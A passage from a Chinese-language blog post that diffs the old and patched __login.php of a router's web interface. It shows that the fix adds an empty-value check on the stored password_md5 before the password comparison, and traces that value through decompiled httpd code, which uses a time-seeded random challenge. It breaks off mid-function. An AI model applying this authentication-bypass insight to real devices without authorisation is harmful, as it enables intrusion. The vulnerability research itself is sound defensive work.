class="string">&quot;&quot;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$ac_auth</span> == <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span> == <span class="variable">$user_d</span> &amp;&amp; <span class="variable">$ac_auth</span> != <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">						<span class="variable">$hmac_md5_path</span> = <span class="string">&quot;/var/proc/web/hmac_md5/&quot;</span>.<span class="variable">$session_uid</span>;</span><br><span class="line">						<span class="variable">$password_noenc</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">						<span class="variable">$acc_per</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;acc_per&quot;</span>);</span><br><span class="line">						<span class="variable">$password_d</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">							<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">							<span class="variable">$private_key</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="variable">$password_md5</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/id&quot;</span>,<span class="variable">$sid</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$LOGIN_USER</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/pass&quot;</span>,     <span class="variable">$password_noenc</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/acc_per&quot;</span>,	<span class="variable">$acc_per</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/private_key&quot;</span>,	<span class="variable">$private_key</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/password_md5&quot;</span>,	<span class="variable">$password_md5</span>);</span><br><span class="line">							<span class="comment">//login access delete hamc</span></span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/challenge&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/public_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/time&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/session_uid&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_username&quot;</span>,<span class="variable">$LOGIN_USER</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_password&quot;</span>,<span class="variable">$LOGIN_PASSWD</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/runtime/web/sub_str&quot;</span>,<span class="string">&quot;RADIUSCLIENT&quot;</span>);</span><br><span class="line">			<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/name&quot;</span>);</span><br><span class="line">			<span class="variable">$password_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/password&quot;</span>);</span><br><span class="line">			<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/group&quot;</span>);</span><br><span class="line">			<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$user_d</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">			<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">			<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;radiusclient&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;1&quot;</span>)	&#123;<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>上面是 __login.php 的代码，从注释和逻辑上大致分析一下可以确定这里就是用于验证登录信息的位置，再来看看修复过的代码：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">/* vi: set sw=4 ts=4: */</span></span><br><span class="line"><span class="comment">//echo &quot;Username[&quot;.$LOGIN_USER.&quot;], Password[&quot;.$LOGIN_PASSWD.&quot;]\n&quot;;</span></span><br><span class="line"><span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;401&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$authnum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$max_authnum</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/authnum&quot;</span>);</span><br><span class="line"><span class="variable">$max_session</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/sessionum&quot;</span>);</span><br><span class="line"><span class="variable">$cfg_radiusclient_enable</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_enable&quot;</span>);</span><br><span class="line"><span class="variable">$index</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$index</span>&lt;=<span class="variable">$max_session</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/user/ac_auth&quot;</span>)==<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$authnum</span>++;&#125;</span><br><span class="line">	<span class="variable">$index</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ac_auth</span>=<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user/ac_auth&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$authnum</span>&gt;=<span class="variable">$max_authnum</span> &amp;&amp; <span class="variable">$ac_auth</span>!=<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$full</span>=<span class="string">&quot;1&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$full</span>==<span class="string">&quot;1&quot;</span> || <span class="variable">$sid</span>==<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;full&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$match</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span>!=<span class="string">&quot;&quot;</span>)<span class="comment">// &amp;&amp; $password!=&quot;&quot;)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// check the user name and password.</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$cfg_radiusclient_enable</span>!=<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="string">&quot;/sys/user&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;&quot;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$ac_auth</span> == <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span> == <span class="variable">$user_d</span> &amp;&amp; <span class="variable">$ac_auth</span> != <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">						<span class="variable">$hmac_md5_path</span> = <span class="string">&quot;/var/proc/web/hmac_md5/&quot;</span>.<span class="variable">$session_uid</span>;</span><br><span class="line">						<span class="variable">$password_noenc</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">						<span class="variable">$acc_per</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;acc_per&quot;</span>);</span><br><span class="line">						<span class="variable">$password_d</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password_d</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">							<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">							<span class="variable">$private_key</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="variable">$password_md5</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/id&quot;</span>,<span class="variable">$sid</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$LOGIN_USER</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/pass&quot;</span>,     <span class="variable">$password_noenc</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/acc_per&quot;</span>,	<span class="variable">$acc_per</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/private_key&quot;</span>,	<span class="variable">$private_key</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/password_md5&quot;</span>,	<span class="variable">$password_md5</span>);</span><br><span class="line">							<span class="comment">//login access delete hamc</span></span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/challenge&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/public_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/time&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/session_uid&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_username&quot;</span>,<span class="variable">$LOGIN_USER</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_password&quot;</span>,<span class="variable">$LOGIN_PASSWD</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/runtime/web/sub_str&quot;</span>,<span class="string">&quot;RADIUSCLIENT&quot;</span>);</span><br><span class="line">			<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/name&quot;</span>);</span><br><span class="line">			<span class="variable">$password_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/password&quot;</span>);</span><br><span class="line">			<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/group&quot;</span>);</span><br><span class="line">			<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$user_d</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">			<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">			<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;radiusclient&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;1&quot;</span>)	&#123;<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>实际上存在差别的代码只有一句：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">旧版本：</span><br><span class="line">if($LOGIN_PASSWD == $password_d)</span><br><span class="line"></span><br><span class="line">新版本：</span><br><span class="line">if($password_d != &quot;&quot; &amp;&amp; $LOGIN_PASSWD == $password_d)</span><br></pre></td></tr></table></figure></div>

<p>新版本中验证了变量 $password_d 是否为空，然后才与 $LOGIN_PASSWD 进行比较。</p>
<p>那么这些变量是从哪里来的呢？通过查看 login.php 代码可以确定 $LOGIN_PASSWD 变量是用户输入的密码，而 $password_d 从上面的代码来看是从文件 &#x2F;var&#x2F;proc&#x2F;web&#x2F;hmac_md5&#x2F;$session_uid&#x2F;password_md5 读取的。</p>
<p>通过搜索 password_md5 ，发现 httpd 文件中包含此字符串，关键函数是 FUN_00012bb8，代码如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_00012bb8</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  uint __seed;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  uint uVar4;</span><br><span class="line">  byte *pbVar5;</span><br><span class="line">  byte *pbVar6;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  <span class="type">long</span> local_29c;</span><br><span class="line">  undefined4 local_25c;</span><br><span class="line">  undefined4 local_258;</span><br><span class="line">  undefined4 local_254;</span><br><span class="line">  undefined4 local_250;</span><br><span class="line">  undefined4 local_24c;</span><br><span class="line">  undefined4 local_248;</span><br><span class="line">  undefined4 local_244;</span><br><span class="line">  undefined4 local_240;</span><br><span class="line">  undefined4 local_23c;</span><br><span class="line">  undefined4 local_238;</span><br><span class="line">  undefined4 local_234;</span><br><span class="line">  undefined4 local_230;</span><br><span class="line">  undefined4 local_22c;</span><br><span class="line">  undefined4 local_228;</span><br><span class="line">  undefined2 uStack548;</span><br><span class="line">  undefined local_222;</span><br><span class="line">  <span class="type">char</span> acStack544 [<span class="number">88</span>];</span><br><span class="line">  undefined auStack456 [<span class="number">68</span>];</span><br><span class="line">  undefined4 local_184;</span><br><span class="line">  undefined4 local_180;</span><br><span class="line">  undefined4 local_17c;</span><br><span class="line">  undefined4 local_178;</span><br><span class="line">  undefined4 local_174;</span><br><span class="line">  undefined4 local_170;</span><br><span class="line">  undefined4 local_16c;</span><br><span class="line">  undefined4 local_168;</span><br><span class="line">  undefined local_164;</span><br><span class="line">  <span class="type">char</span> acStack352 [<span class="number">128</span>];</span><br><span class="line">  <span class="type">char</span> acStack224 [<span class="number">128</span>];</span><br><span class="line">  undefined4 local_60;</span><br><span class="line">  undefined4 local_5c;</span><br><span class="line">  undefined4 local_58;</span><br><span class="line">  undefined4 local_54;</span><br><span class="line">  undefined4 local_50;</span><br><span class="line">  undefined local_4c;</span><br><span class="line">  undefined4 local_48;</span><br><span class="line">  undefined4 local_44;</span><br><span class="line">  undefined4 local_40;</span><br><span class="line">  undefined4 local_3c;</span><br><span class="line">  undefined4 local_38;</span><br><span class="line">  undefined4 local_34;</span><br><span class="line">  undefined4 local_30;</span><br><span class="line">  undefined4 local_2c;</span><br><span class="line">  undefined4 local_28;</span><br><span class="line">  uint local_24;</span><br><span class="line">  </span><br><span class="line">  local_48 = <span class="number">0</span>;</span><br><span class="line">  local_44 = <span class="number">0</span>;</span><br><span class="line">  local_40 = <span class="number">0</span>;</span><br><span class="line">  local_3c = <span class="number">0</span>;</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_34 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_2c = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_24 = <span class="number">0</span>;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  local_5c = <span class="number">0</span>;</span><br><span class="line">  local_58 = <span class="number">0</span>;</span><br><span class="line">  local_54 = <span class="number">0</span>;</span><br><span class="line">  local_50 = <span class="number">0</span>;</span><br><span class="line">  local_4c = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(acStack224,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack352,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  local_184 = <span class="number">0</span>;</span><br><span class="line">  local_180 = <span class="number">0</span>;</span><br><span class="line">  local_17c = <span class="number">0</span>;</span><br><span class="line">  local_178 = <span class="number">0</span>;</span><br><span class="line">  local_174 = <span class="number">0</span>;</span><br><span class="line">  local_170 = <span class="number">0</span>;</span><br><span class="line">  local_16c = <span class="number">0</span>;</span><br><span class="line">  local_168 = <span class="number">0</span>;</span><br><span class="line">  local_164 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack456,<span class="number">0</span>,<span class="number">0x41</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack544,<span class="number">0</span>,<span class="number">0x56</span>);</span><br><span class="line">  local_22c = <span class="number">0</span>;</span><br><span class="line">  local_228 = <span class="number">0</span>;</span><br><span class="line">  uStack548 = <span class="number">0</span>;</span><br><span class="line">  local_222 = <span class="number">0</span>;</span><br><span class="line">  local_23c = <span class="number">0</span>;</span><br><span class="line">  local_238 = <span class="number">0</span>;</span><br><span class="line">  local_234 = <span class="number">0</span>;</span><br><span class="line">  local_230 = <span class="number">0</span>;</span><br><span class="line">  local_25c = <span class="number">0</span>;</span><br><span class="line">  local_258 = <span class="number">0</span>;</span><br><span class="line">  local_254 = <span class="number">0</span>;</span><br><span class="line">  local_250 = <span class="number">0</span>;</span><br><span class="line">  local_24c = <span class="number">0</span>;</span><br><span class="line">  local_248 = <span class="number">0</span>;</span><br><span class="line">  local_244 = <span class="number">0</span>;</span><br><span class="line">  local_240 = <span class="number">0</span>;</span><br><span class="line">  FUN_0001f460(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/sessiontimeout&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>);</span><br><span class="line">  sysinfo((sysinfo *)&amp;local_29c);</span><br><span class="line">  iVar1 = FUN_0001f7b8(param_1,*(undefined4 *)(param_1 + <span class="number">0xbcc</span>));</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">    __s1 = (<span class="type">char</span> *)(param_1 + <span class="number">0x13f8</span>);</span><br><span class="line">    local_22c = <span class="number">0</span>;</span><br><span class="line">    local_228 = <span class="number">0</span>;</span><br><span class="line">    uStack548 = <span class="number">0</span>;</span><br><span class="line">    local_222 = <span class="number">0</span>;</span><br><span class="line">    FUN_0001f460(&amp;local_22c,<span class="number">10</span>,<span class="string">&quot;%s/hmac_md5/%s/session_uid&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,(<span class="type">char</span> *)&amp;local_22c);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_25c,<span class="number">0x1f</span>,<span class="string">&quot;%d&quot;</span>,local_29c);</span><br><span class="line">      FUN_0001f4f4(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/time&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      __seed = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">      srand(__seed);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        iVar2 = rand();</span><br><span class="line">        __seed = iVar2 % <span class="number">0x3e</span>;</span><br><span class="line">        <span class="keyword">if</span> (__seed &lt; <span class="number">10</span>) &#123;</span><br><span class="line">          *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          uVar4 = __seed - <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">if</span> (uVar4 &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">            __seed = __seed + <span class="number">0x37</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (uVar4 &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">            *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (__seed - <span class="number">0x24</span> &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">              *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed + <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              *(undefined *)((<span class="type">int</span>)&amp;local_48 + iVar1) = <span class="number">0x30</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = iVar1 + <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> (iVar1 != <span class="number">0x28</span>);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      local_24 = local_24 &amp; <span class="number">0xffffff</span>;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="type">char</span> *)&amp;local_60,(<span class="type">char</span> *)&amp;local_48,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(acStack224,(<span class="type">char</span> *)&amp;local_34,<span class="number">0x14</span>);</span><br><span class="line">      FUN_0001f4f4(&amp;local_60,<span class="number">0x14</span>,<span class="string">&quot;%s/hmac_md5/%s/challenge&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_0001f4f4(acStack224,<span class="number">0x14</span>,<span class="string">&quot;%s/hmac_md5/%s/public_key&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_0001f4f4(__s1,<span class="number">10</span>,<span class="string">&quot;%s/hmac_md5/%s/session_uid&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_00021320(auStack456,<span class="number">0x41</span>,<span class="string">&quot;/sys/user:%d/%s&quot;</span>,<span class="number">1</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;password  = %s\n&quot;</span>,auStack456);</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack544,<span class="number">0x56</span>,<span class="string">&quot;%s%s&quot;</span>,acStack224,auStack456);</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;public_key_add_pass = %s\n&quot;</span>,acStack544);</span><br><span class="line">      local_23c = <span class="number">0</span>;</span><br><span class="line">      local_238 = <span class="number">0</span>;</span><br><span class="line">      local_234 = <span class="number">0</span>;</span><br><span class="line">      local_230 = <span class="number">0</span>;</span><br><span class="line">      sVar3 